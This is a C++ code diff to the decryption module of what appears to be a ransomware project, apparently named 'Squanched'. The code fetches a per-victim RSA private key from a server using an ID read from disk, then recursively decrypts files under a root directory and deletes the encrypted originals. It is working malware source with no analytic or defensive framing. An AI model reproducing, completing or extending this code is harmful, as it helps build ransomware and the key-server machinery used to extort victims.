@@ -1,19 +1,17 @@
-
 #include "Decryption.h"
 
 
-#if 1
 std::string hex_to_string(const std::string& input);
 static DWORD getKeyHandle(PBYTE key, BCRYPT_KEY_HANDLE& keyHandle, BCRYPT_ALG_HANDLE& aesHandle);
-Status getPrivateParams(string id, RsaDecryptor& rsaDecryptor);
+Status getPrivateParams(string id, StringPrivateBlob& rsaDecryptor);
 
-Status getPrivateParams(string id, RsaDecryptor& rsaDecryptor)
+Status getPrivateParams(string id, StringPrivateBlob& rsaDecryptor)
 {
 	string url = URL_PRIVATE_RSA + id;
 	string chunk;
 	Status status;
 	status = getFromServer(url, chunk);
-	parsePrivateKey(chunk, rsaDecryptor);
+	rsaDecryptor = parsePrivateKey(chunk);
 	return status;
 }
 
@@ -186,6 +184,7 @@ CLEAN:
 	if (cipher)
 		HeapFree(GetProcessHeap(), 0, cipher);
 }
+
 std::string hex_to_string(const std::string& input)
 {
 	static const char* const lut = "0123456789ABCDEF";
@@ -208,6 +207,27 @@ std::string hex_to_string(const std::string& input)
 	}
 	return output;
 }
+
+void iterate(const path& parent, RsaDecryptor rsaDecryptor) {
+	string path;
+	directory_iterator end_itr;
+
+	for (directory_iterator itr(parent); itr != end_itr; ++itr) {
+		path = itr->path().string();
+
+		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
+			if (is_valid_folder(path))
+			{
+				iterate(path, rsaDecryptor);
+			}
+		}
+		else {
+			decrypt_wrapper(path, rsaDecryptor);
+			remove(path);
+		}
+	}
+}
+
 int decryption_main()
 {
 	PBYTE masterIV = nullptr, masterKey = nullptr;
@@ -216,7 +236,8 @@ int decryption_main()
 	string path = ROOT_DIR;
 	string pathToID = get_path_to_id();
 	std::ifstream idFile;
-	string sMasterIV, sMasterKey;
+	RsaDecryptor rsaDecryptor;
+	StringPrivateBlob stringPrivateBlob;
 
 //	string pathToMasters = "C:\\rans\\236499\\Squanched\\Debug\\KEY-IV.txt";
 //	std::ifstream masterKeyIVFile;
@@ -231,18 +252,23 @@ int decryption_main()
 	idFile.close();
 	id.erase(0, 1);
 	id = string_to_hex(id);
-	
-	status = getFromServer(id, sMasterIV, sMasterKey);
+
+	status = getPrivateParams(id, stringPrivateBlob);
+	if(!NT_SUCCESS(status))
+	{
+
+		return -1;
+	}
+
+	rsaDecryptor.init_Decryptor(stringPrivateBlob);
+
+	/*status = getFromServer(id, sMasterIV, sMasterKey);
 	if(!NT_SUCCESS(status))
 	{
 		return -1;
-	}
-	sMasterIV = hex_to_string(sMasterIV);
-	sMasterKey = hex_to_string(sMasterKey);
-	masterIV = (BYTE*)sMasterIV.c_str();
-	masterKey = (BYTE*)sMasterKey.c_str();
-	
-	iterate(path, &decrypt_wrapper, masterIV, masterKey);
+	}*/
+
+	iterate(path, rsaDecryptor);
 
 
 	remove(pathToID);
@@ -252,5 +278,3 @@ int decryption_main()
 
 	return 0;
 }
-
-#endif
